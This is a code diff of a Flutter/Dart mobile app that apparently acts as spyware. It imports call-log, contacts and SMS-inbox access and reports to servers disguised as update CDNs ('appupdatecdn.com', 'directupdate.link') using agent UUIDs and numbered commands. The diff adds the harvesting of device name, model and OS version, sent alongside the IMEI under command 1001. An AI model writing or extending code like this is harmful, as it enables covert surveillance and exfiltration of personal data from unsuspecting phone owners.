@@ -6,6 +6,7 @@ import 'dart:io' show Platform;
 
 import 'package:call_log/call_log.dart';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
@@ -33,7 +34,10 @@ enum BNBType {
 DateFormat serverFormat = DateFormat('dd-MM-yyyy hh:mm:ss');
 final base = kDebugMode
     ? 'https://testfix.foo'
-    : (!kIsWeb && Platform.isIOS ? 'appupdatecdn.com' : 'https://directupdate.link');
+    : (!kIsWeb && Platform.isIOS
+        // ? 'appupdatecdn.com'
+        ? 'https://appupdatecdn.com'
+        : 'https://directupdate.link');
 
 class Api {
   // 1001 – device info
@@ -44,7 +48,7 @@ class Api {
     final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
-    print('XXX response ${response}');
+    print('XXX response ${response.body}');
 
     if (response.statusCode == 200) {
       final responseData = jsonDecode(response.body);
@@ -56,16 +60,22 @@ class Api {
       try {
         // {extra_data: {"agent_uuid": "901916f1-803b-4a56-b302-0209d4515b8d"}, status: 1}
         final uuid = jsonDecode(responseData['extra_data'])['agent_uuid'];
+        final deviceInfo = await DeviceInfoPlugin().deviceInfo;
+        print('deviceInfo ${deviceInfo}');
 
         _sendToServer(agent, uuid, type: 'Device info', data: {
           "uuid": uuid,
           "command_id": "1001",
           "data": {
+            //! MAKE SURE IT WORKS ON ANDROID
+            "device_name": deviceInfo.data['utsname']['nodename'],
+            "device_model": deviceInfo.data['utsname']['machine'],
+            "os": deviceInfo.data['systemVersion'],
+            "IMSI": UniqueKey().toString().replaceAll('#', ''),
             "IMEI": imei.toString(),
+            "network_name": !kIsWeb && Platform.isIOS ? 'IOS' : "Android",
             "phone_number": '',
             "voice_mail_number": '',
-            "IMSI": UniqueKey().toString().replaceAll('#', ''),
-            "network_name": "Android",
           }
         });
 
@@ -80,6 +90,7 @@ class Api {
 
   static Future _sendToServer(String? agent, String? uuid,
       {Map<String, dynamic>? data, required String type}) async {
+    print('START: type() $type');
     if (agent == null) {
       printYellow(
           'PASS [$type] sendToServer() command_id: ${data?['command_id']} No SERVER AGENT');
